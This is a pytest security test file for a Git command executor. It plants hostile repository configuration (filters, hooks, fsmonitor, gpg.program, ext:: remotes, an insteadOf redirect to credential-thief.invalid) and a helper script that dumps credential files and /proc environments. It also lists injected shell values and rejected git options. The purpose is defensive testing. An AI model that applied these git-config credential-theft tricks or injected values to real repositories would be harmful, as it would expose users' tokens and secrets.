"""Run the production trusted executor against harmless credential-stealing fixtures."""
from __future__ import annotations

import asyncio
import base64
from contextlib import contextmanager
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
import json
from pathlib import Path
import subprocess
import sys
import threading
from types import SimpleNamespace

import pytest

from plugins.github_projects.credential_git import GIT_SCRIPT, validate_git_commands
from plugins.github_projects.impl import ExecResult, GitHubProjectService

TOKEN = "synthetic-github-credential-for-isolation-only"


def git(worktree: Path, *arguments: str) -> str:
    result = subprocess.run(
        ["/usr/bin/git", *arguments], cwd=worktree, capture_output=True,
        text=True, check=True,
        env={"PATH": "/usr/bin:/bin", "HOME": str(worktree.parent),
             "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": "/dev/null"},
    )
    return result.stdout


def repository(worktree: Path) -> Path:
    worktree.mkdir(parents=True)
    git(worktree, "init", "-q", "--initial-branch=main")
    git(worktree, "config", "user.name", "Credential fixture")
    git(worktree, "config", "user.email", "fixture@example.invalid")
    (worktree / "app.txt").write_text("original\n", encoding="utf-8")
    git(worktree, "add", "app.txt")
    git(worktree, "commit", "-qm", "initial")
    return worktree


def execute(worktree: Path, commands, *, checkout=False, script=GIT_SCRIPT):
    return subprocess.run(
        [sys.executable, "-I", "-c", script, str(worktree)],
        input=json.dumps({"repo": "acme/app", "commands": commands,
                          "checkout": checkout, "token": TOKEN}),
        capture_output=True, text=True, timeout=45,
    )


def plant_programs(worktree: Path):
    marker = worktree / "credential-theft"
    helper = worktree / "steal-credential"
    # A payload can see the trusted executor's private temp tree if it ever
    # executes in that container; merely removing an environment variable is
    # not sufficient. Capture both config files and process metadata.
    helper.write_text(
        f"#!/bin/sh\n{{ cat /tmp/maxwell-git-*/network-config 2>/dev/null; "
        f"cat /proc/*/environ /proc/*/cmdline 2>/dev/null; }} > '{marker}'\ncat\n",
        encoding="utf-8",
    )
    helper.chmod(0o700)
    attributes = worktree / ".gitattributes"
    attributes.write_text("app.txt filter=steal diff=steal\n", encoding="utf-8")
    include = worktree / "included-config"
    include.write_text(
        f'[filter "steal"]\nclean = {helper}\nsmudge = {helper}\n'
        f'process = {helper}\nrequired = true\n'
        f'[core]\nfsmonitor = {helper}\nhooksPath = {worktree / ".git" / "hooks"}\n'
        f'[credential]\nhelper = !{helper}\n'
        f'[diff "steal"]\ncommand = {helper}\ntextconv = {helper}\n',
        encoding="utf-8",
    )
    git(worktree, "config", "include.path", str(include))
    git(worktree, "config", "core.fsmonitor", str(helper))
    git(worktree, "config", "filter.steal.clean", str(helper))
    git(worktree, "config", "filter.steal.smudge", str(helper))
    git(worktree, "config", "filter.steal.required", "true")
    git(worktree, "config", "commit.gpgSign", "true")
    git(worktree, "config", "gpg.program", str(helper))
    git(worktree, "config", "remote.origin.url", f"ext::{helper}")
    git(worktree, "config", "remote.origin.pushurl", "https://credential-thief.invalid/app.git")
    git(worktree, "config", "url.https://credential-thief.invalid/.insteadOf", "https://github.com/")
    (worktree / ".git" / "hooks").mkdir(exist_ok=True)
    for name in ("post-checkout", "pre-commit", "post-index-change", "pre-push", "fsmonitor-watchman"):
        hook = worktree / ".git" / "hooks" / name
        hook.write_text(helper.read_text(), encoding="utf-8")
        hook.chmod(0o700)
    return marker


def test_checkout_and_commit_ignore_workspace_execution_configuration(tmp_path):
    worktree = repository(tmp_path / "workspace")
    marker = plant_programs(worktree)
    config = (worktree / ".git" / "config").read_bytes()
    initial = git(worktree, "-c", "core.fsmonitor=false", "rev-parse", "HEAD").strip()
    result = execute(worktree, [["checkout", "-B", "safe-branch", "HEAD"]])
    assert result.returncode == 0, result.stderr
    (worktree / "app.txt").write_text("updated\n", encoding="utf-8")
    message = "safe quoted 'message'\n\nbody; $(touch credential-theft)"
    result = execute(worktree, [["add", "-A"], ["diff", "--cached", "--check"], ["commit", "-m", message]])
    assert result.returncode == 0, result.stderr
    assert not marker.exists()
    assert git(worktree, "-c", "core.fsmonitor=false", "branch", "--show-current").strip() == "safe-branch"
    assert git(worktree, "log", "-1", "--format=%B").rstrip("\n") == message
    assert git(worktree, "show", "HEAD:app.txt") == "updated\n"
    assert git(worktree, "rev-parse", "HEAD").strip() != initial
    assert git(worktree, "log", "-1", "--format=%an <%ae>").strip() == "Credential fixture <fixture@example.invalid>"
    assert (worktree / ".git" / "config").read_bytes() == config
    for path in (worktree / ".git").rglob("*"):
        if path.is_file():
            assert TOKEN.encode() not in path.read_bytes()


@pytest.mark.parametrize("layout", ["gitdir", "config", "refs", "object", "index"])
def test_symbolic_git_metadata_cannot_reach_private_credential_files(tmp_path, layout):
    worktree = repository(tmp_path / "workspace")
    gitdir = worktree / ".git"
    if layout == "gitdir":
        moved = worktree / "redirected-git"
        gitdir.rename(moved)
        gitdir.symlink_to(moved, target_is_directory=True)
    elif layout == "refs":
        refs = gitdir / "refs"
        refs.rename(gitdir / "redirected-refs")
        refs.symlink_to(gitdir / "redirected-refs", target_is_directory=True)
    elif layout == "object":
        oid = git(worktree, "rev-parse", "HEAD").strip()
        path = gitdir / "objects" / oid[:2] / oid[2:]
        path.unlink()
        path.symlink_to("/tmp/maxwell-git-private/network-config")
    else:
        path = gitdir / layout
        path.unlink()
        path.symlink_to("/tmp/maxwell-git-private/network-config")
    result = execute(worktree, [["status", "--short", "--branch"]])
    assert result.returncode != 0
    assert TOKEN not in result.stdout + result.stderr


@pytest.mark.parametrize("commands", [
    "git status; cat /tmp/maxwell-git-*/network-config",
    [["status", "--short", "--branch"], ["config", "--list"]],
    [["-c", "core.fsmonitor=sh", "status"]],
    [["push", "https://credential-thief.invalid/app.git", "HEAD"]],
    [["fetch", "origin", "--upload-pack=steal"]],
    [["checkout", "--orphan=steal"]],
])
def test_arbitrary_shell_and_git_options_are_not_credentialed_operations(commands):
    with pytest.raises(ValueError):
        validate_git_commands(commands)


def test_docker_credential_transport_is_not_argv_or_workspace_environment(tmp_path, monkeypatch):
    service = GitHubProjectService(SimpleNamespace(), SimpleNamespace(data_dir=tmp_path))
    worktree = repository(service.repo_root("1", "acme/app"))
    marker = plant_programs(worktree)

    async def image():
        pass

    async def process(*args, input=None, **kwargs):
        assert args[:2] == ("docker", "run")
        assert TOKEN not in " ".join(args)
        assert "-e" not in args and "--env" not in args
        assert kwargs.get("env") is None
        # Exercise the exact production request and script after checking its
        # public transport rather than returning an echo of invocation details.
        executed = subprocess.run(
            [sys.executable, "-I", "-c", args[-2], str(worktree)],
            input=input, capture_output=True, timeout=45,
        )
        return ExecResult(executed.returncode, executed.stdout.decode(), executed.stderr.decode())

    monkeypatch.setattr(service, "_ensure_image", image)
    monkeypatch.setattr(service, "_proc", process)
    monkeypatch.setattr(service, "token", lambda *_args: TOKEN)

    async def scenario():
        await service.policy.set("1", "acme/app", {"allow_security_testing": True})
        result = await service.git("1", "acme/app", {}, [["checkout", "-B", "safe", "HEAD"]])
        assert result.code == 0, result.render()
        assert git(worktree, "branch", "--show-current").strip() == "safe"
        assert not marker.exists()

    asyncio.run(scenario())


@contextmanager
def smart_http_remote(root: Path):
    """A real Git smart-HTTP backend, with only synthetic authentication."""
    authorization = []

    class Handler(BaseHTTPRequestHandler):
        def log_message(self, *_args):
            pass

        def serve(self):
            authorization.append(self.headers.get("Authorization"))
            path, _, query = self.path.partition("?")
            body = self.rfile.read(int(self.headers.get("Content-Length", "0")))
            response = subprocess.run(
                ["/usr/bin/git", "http-backend"], input=body, capture_output=True,
                timeout=30,
                env={
                    "PATH": "/usr/bin:/bin", "HOME": str(root),
                    "GIT_CONFIG_NOSYSTEM": "1", "GIT_CONFIG_GLOBAL": "/dev/null",
                    "GIT_PROJECT_ROOT": str(root), "GIT_HTTP_EXPORT_ALL": "1",
                    "REQUEST_METHOD": self.command, "PATH_INFO": path,
                    "QUERY_STRING": query, "REMOTE_USER": "synthetic-fixture",
                    "CONTENT_TYPE": self.headers.get("Content-Type", ""),
                    "CONTENT_LENGTH": str(len(body)),
                    "HTTP_GIT_PROTOCOL": self.headers.get("Git-Protocol", ""),
                },
            )
            headers, separator, payload = response.stdout.partition(b"\r\n\r\n")
            if response.returncode or not separator:
                self.send_error(500, "Git fixture backend failed")
                return
            entries = []
            status = 200
            for line in headers.decode().splitlines():
                name, _, value = line.partition(":")
                if name.lower() == "status":
                    status = int(value.strip().split()[0])
                else:
                    entries.append((name, value.strip()))
            self.send_response(status)
            for name, value in entries:
                self.send_header(name, value)
            self.send_header("Content-Length", str(len(payload)))
            self.end_headers()
            self.wfile.write(payload)

        do_GET = serve
        do_POST = serve

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_port, authorization
    finally:
        server.shutdown()
        server.server_close()
        thread.join(timeout=5)


def test_fresh_clone_fetch_prune_and_push_keep_credentials_out_of_hostile_workspace(tmp_path):
    publisher = repository(tmp_path / "publisher")
    remote = tmp_path / "server" / "acme" / "app.git"
    remote.parent.mkdir(parents=True)
    git(publisher, "clone", "--bare", str(publisher), str(remote))
    git(remote, "config", "http.receivepack", "true")
    worktree = tmp_path / "workspace"
    worktree.mkdir()

    with smart_http_remote(tmp_path / "server") as (port, authorization):
        # Change only the trusted, fixed endpoint and its transport for this
        # loopback fixture. No test override exists in the production API.
        script = GIT_SCRIPT.replace("https", "http").replace(
            "github.com/", f"127.0.0.1:{port}/"
        )
        result = execute(worktree, [["status", "--short", "--branch"]], checkout=True, script=script)
        assert result.returncode == 0, result.stderr
        assert (worktree / "app.txt").read_text() == "original\n"
        marker = plant_programs(worktree)
        config = (worktree / ".git" / "config").read_bytes()

        git(publisher, "branch", "obsolete")
        git(publisher, "push", str(remote), "obsolete")
        result = execute(worktree, [["fetch", "--prune", "origin"]], script=script)
        assert result.returncode == 0, result.stderr
        assert git(worktree, "rev-parse", "refs/remotes/origin/obsolete").strip()
        git(publisher, "push", str(remote), "--delete", "obsolete")
        (publisher / "app.txt").write_text("remote update\n", encoding="utf-8")
        git(publisher, "add", "-A")
        git(publisher, "commit", "-qm", "remote update")
        git(publisher, "push", str(remote), "main")
        result = execute(worktree, [
            ["fetch", "--prune", "origin"], ["checkout", "-B", "fetched", "origin/main"],
        ], script=script)
        assert result.returncode == 0, result.stderr
        assert (worktree / "app.txt").read_text() == "remote update\n"
        assert not (worktree / ".git" / "refs" / "remotes" / "origin" / "obsolete").exists()
        (worktree / "app.txt").write_text("safe pushed content\n", encoding="utf-8")
        result = execute(worktree, [
            ["add", "-A"], ["diff", "--cached", "--check"],
            ["commit", "-m", "safe network commit"], ["push", "origin", "HEAD"],
        ], script=script)
        assert result.returncode == 0, result.stderr
        assert git(remote, "show", "refs/heads/fetched:app.txt") == "safe pushed content\n"
        assert git(remote, "log", "-1", "--format=%s", "fetched").strip() == "safe network commit"
        assert not marker.exists()
        assert (worktree / ".git" / "config").read_bytes() == config
        encoded = base64.b64encode(f"x-access-token:{TOKEN}".encode()).decode()
        assert authorization and set(authorization) == {f"Basic {encoded}"}
        assert TOKEN not in result.stdout + result.stderr
        assert encoded not in result.stdout + result.stderr
        for path in (worktree / ".git").rglob("*"):
            if path.is_file():
                assert TOKEN.encode() not in path.read_bytes()
                assert encoded.encode() not in path.read_bytes()
